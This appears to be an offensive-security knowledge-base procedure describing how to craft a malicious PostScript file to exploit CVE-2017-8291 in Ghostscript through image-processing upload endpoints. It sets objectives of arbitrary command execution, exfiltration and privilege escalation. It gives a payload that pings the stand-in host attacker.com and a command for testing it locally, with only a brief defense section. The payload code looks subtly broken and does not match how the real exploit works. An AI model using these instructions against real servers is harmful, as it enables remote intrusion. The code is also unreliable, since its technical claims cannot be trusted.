---
id: 22676d7f-c5e5-4ac0-b934-17000421d838
name: Craft Malicious PostScript File for Ghostscript RCE
type: procedure
verified: false
submitted: true
created_at: '2025-12-11T06:10:15.549Z'
updated_at: '2025-12-11T06:10:15.549Z'
tactics:
  - '[[Execution]]'
techniques:
  - '[[Command-Line Interface]]'
sub_techniques: []
tags:
  - rce
  - ghostscript
  - file-crafting
commands:
  - '[[commands/ping-test-poc]]'
platforms:
  - Web
tools:
  - '[[tools/ImageMagick]]'
  - '[[tools/GraphicsMagick]]'
  - '[[tools/Ghostscript]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
validated: true
mitre_tactics:
  - '[[TA0002]]'
mitre_techniques:
  - '[[T1059]]'
---

# Craft Malicious PostScript File for Ghostscript RCE

## Summary

This procedure involves creating a malicious PostScript or EPS file that embeds arbitrary shell commands to exploit CVE-2017-8291 in Ghostscript, enabling remote code execution when processed by vulnerable image libraries like ImageMagick.

## Description

The procedure targets systems using Ghostscript for image processing, such as web applications handling file uploads. By crafting a file starting with '%!' and embedding a system command, attackers can trigger execution during server-side conversion. This was used in Basecamp to gain a remote shell. Prerequisites include knowledge of PostScript syntax and access to a vulnerable upload endpoint.

## Requirements

1. Text editor or scripting tool to create PostScript file.
2. Local Ghostscript installation for testing.
3. Access to a vulnerable web upload feature.

## Defense

Defensive measures and detection strategies:

- Update Ghostscript to patched versions and configure ImageMagick policies to disable PS/EPS processing.
- Implement strict file type validation and content inspection on uploads.

## Objectives

1. Create a file that executes arbitrary commands on the server.
2. Demonstrate proof-of-concept with network exfiltration.
3. Enable further exploitation like privilege escalation.

## Instructions

### Step 1: Create PostScript File with Embedded Command

**Context**: Embed a shell command in a PostScript file to exploit the Ghostscript bug.

**Command** ([[commands/ping-test-poc]]):
```bash
# Content in rce.ps:
%!PS
(false) (ping -c1 attacker.com) .runlibfile
```

> This embeds the ping command, which executes when Ghostscript processes the file.

### Step 2: Test Locally

**Context**: Verify the file triggers the vulnerability locally.

Run Ghostscript on the file:

```bash
gs rce.ps
```

> Expect to see ping traffic to attacker.com if vulnerable.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Command-Line Interface]]

### Sub-Techniques


## Commands Used

- [[commands/ping-test-poc]]

## Tools Used

- [[tools/Ghostscript]]

## Tags

- [[rce]]
- [[tools/Ghostscript]]
